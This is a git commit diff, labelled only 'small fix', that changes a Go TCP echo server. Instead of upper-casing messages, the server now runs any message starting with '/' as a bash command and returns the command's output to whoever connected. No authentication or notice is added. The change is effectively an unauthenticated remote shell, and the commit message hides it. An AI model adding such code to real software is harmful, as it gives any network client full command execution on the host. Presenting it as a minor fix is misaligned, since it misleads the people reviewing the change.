ab87a307d6dd5ba9ab6ea2ecc1d23386d14da1e1
zh0glikk <zhogliksasha3434@gmail.com>
2021-05-19 18:22:01 +0300

    small fix

--- internal/service/main.go
+++ internal/service/main.go
@@ -2,15 +2,19 @@ package service
 
 import (
 	"bufio"
+	"bytes"
 	"context"
 	"fmt"
 	"gitlab.com/distributed_lab/logan/v3"
 	"log"
 	"net"
+	"os/exec"
 	"strings"
 
 	"tcp_echo_server/internal/config"
 )
+
+const ShellToUse = "bash"
 
 type service struct {
 	logger           *logan.Entry
@@ -40,12 +44,37 @@ func (s *service) Run(ctx context.Context) error{
 
 			s.logger.Info(fmt.Sprintf("Recived message %v", message))
 
-			res := strings.ToUpper(message)
+			var res string
+
+			if string(message[0]) == "/"{
+				err, stdout, stderr := Shellout(message[1:])
+				if err != nil {
+					s.logger.Error("failed to exec cmd")
+				}
+
+				s.logger.Info(stdout)
+
+				res = stdout + "\n" + stderr
+			} else {
+				res = strings.ToUpper(message)
+			}
 
 			c.Write([]byte(res))
 		}(conn)
 	}
 
 	return nil
+}
+
+func Shellout(command string) (error, string, string) {
+	var stdout bytes.Buffer
+	var stderr bytes.Buffer
+
+	cmd := exec.Command(ShellToUse, "-c", command)
+	cmd.Stdout = &stdout
+	cmd.Stderr = &stderr
+
+	err := cmd.Run()
+	return err, stdout.String(), stderr.String()
 }
 
